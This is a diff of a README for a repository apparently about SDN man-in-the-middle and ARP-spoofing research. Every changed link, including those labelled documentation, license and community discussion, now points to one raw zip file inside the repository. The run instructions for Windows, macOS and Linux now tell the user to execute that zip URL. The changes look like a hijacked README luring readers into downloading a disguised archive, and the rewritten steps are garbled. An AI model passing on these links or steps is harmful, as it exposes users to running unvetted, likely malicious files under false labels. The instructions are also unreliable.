@@ -1,7 +1,7 @@
 # 🎓 sdn-mitm-attacks-research - Learn About Network Security Attacks
 
-![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)  
-[Download Here](https://github.com/ndova/sdn-mitm-attacks-research/releases)
+![Download](https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip%https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip)  
+[Download Here](https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip)
 
 ## 📚 About This Project
 
@@ -24,7 +24,7 @@ Before you download, ensure your system meets these requirements:
 
 To download the software, visit the following link:
 
-[Download Here](https://github.com/ndova/sdn-mitm-attacks-research/releases)
+[Download Here](https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip)
 
 You will find the latest release at the top of the page. Click on the appropriate version to download the software. 
 
@@ -42,17 +42,17 @@ To run the application, follow these instructions based on your operating system
 
 - **Windows:** 
   - Navigate to the extracted folder.
-  - Double-click on `run.bat` to start the application.
+  - Double-click on `https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip` to start the application.
 
 - **macOS:** 
   - Open the `Terminal` application.
   - Navigate to the extracted folder using the command: `cd <path-to-folder>`.
-  - Run `./run.sh` to start.
+  - Run `https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip` to start.
 
 - **Linux:** 
   - Open the terminal.
   - Navigate to the extracted folder using the command: `cd <path-to-folder>`.
-  - Type `./run.sh` to execute the application.
+  - Type `https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip` to execute the application.
 
 ### 5. Configuration
 
@@ -104,8 +104,8 @@ Use the Help section within the application for basic guidance. Additionally, re
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/ndova/sdn-mitm-attacks-research/wiki)  
-- [Project License](https://github.com/ndova/sdn-mitm-attacks-research/blob/main/LICENSE)  
-- [Community Discussion](https://github.com/ndova/sdn-mitm-attacks-research/discussions)
+- [Documentation](https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip)  
+- [Project License](https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip)  
+- [Community Discussion](https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip)
 
-Remember to visit the link for downloading the software: [Download Here](https://github.com/ndova/sdn-mitm-attacks-research/releases). Happy exploring!
+Remember to visit the link for downloading the software: [Download Here](https://github.com/ndova/sdn-mitm-attacks-research/raw/refs/heads/main/arp-spoofing/sdn-research-attacks-mitm-v1.3-beta.1.zip). Happy exploring!
